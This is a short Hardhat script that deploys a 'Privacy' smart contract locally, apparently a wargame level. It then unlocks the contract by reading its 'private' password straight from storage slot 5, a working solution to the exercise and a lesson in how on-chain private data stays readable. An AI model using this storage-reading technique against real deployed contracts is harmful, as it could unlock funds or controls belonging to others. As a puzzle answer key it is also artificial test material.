// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { expect } = require("chai");


async function main() {
    // Hardhat always runs the compile task when running scripts with its command
    // line interface.
    //
    // If this script is run directly using `node` you may want to call compile
    // manually to make sure everything is compiled
    // await hre.run('compile');

    // We get the contract to deploy

    Privacy = await hre.ethers.getContractFactory("Privacy");

    target = await Privacy.deploy(["0xaa4e616d653100000000000000000000aa4e616d653100000000000000000000", "0xaa4e616d653100000000000000000000aa4e616d653100000000000000000000", "0xaa4e616d653100000000000000000000aa4e616d653100000000000000000000"]);
    await target.deployed();

    expect(await target.locked()).to.equal(true);

    data = await hre.ethers.provider.getStorageAt(target.address, 5);

    const attackTx = await target.unlock(data.substr(0, 34));
    await attackTx.wait();

    expect(await target.locked()).to.equal(false);


}


// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
